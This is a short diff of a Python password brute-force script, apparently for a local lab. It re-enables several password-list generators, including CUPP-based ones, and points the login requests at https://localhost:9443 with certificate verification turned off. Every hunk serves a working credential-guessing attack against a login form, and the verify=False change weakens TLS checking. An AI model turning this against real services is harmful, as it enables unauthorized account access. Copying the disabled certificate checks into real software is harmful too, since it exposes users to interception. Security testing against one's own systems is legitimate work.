@@ -2,7 +2,6 @@ import requests
 from timeit import default_timer as timer
 import os
 import threading
-import time
 import sys 
 session = requests.Session()
 passwordCrackCombinations = {
@@ -157,20 +156,20 @@ def generateFromCupp():
         passwordCrackCombinations["cupp"].append(batch)         
 
 def generateDictCombinations(user):
-    # generateAllNumbersPasswords()
-    # generateAllBirthdayPasswords()
-    # generateCombinedLowercaseLettersNumbersPasswords(user)
-    # generateCombinedUppercaseLettersNumbersPasswords(user)
+    generateAllNumbersPasswords()
+    generateAllBirthdayPasswords()
+    generateCombinedLowercaseLettersNumbersPasswords(user)
+    generateCombinedUppercaseLettersNumbersPasswords(user)
     generateComplexPasswords(user)
     generateFromCommonPasswords()
     generateFromCupp()
 
 def parallel_dict_brute_force(value, attempts):
     for password in value:
-        url = "http://localhost:8081/login"
+        url = "https://localhost:9443/login"
         body = {'username':'test', 'password': password}
         print(f"checking {password}")
-        resp = session.post(url, json=body)
+        resp = session.post(url, json=body, verify=False)
         attempts = attempts + 1
         if resp.status_code == 200:
              print(f"Password cracked in {attempts} attempts. The password is {password}.")
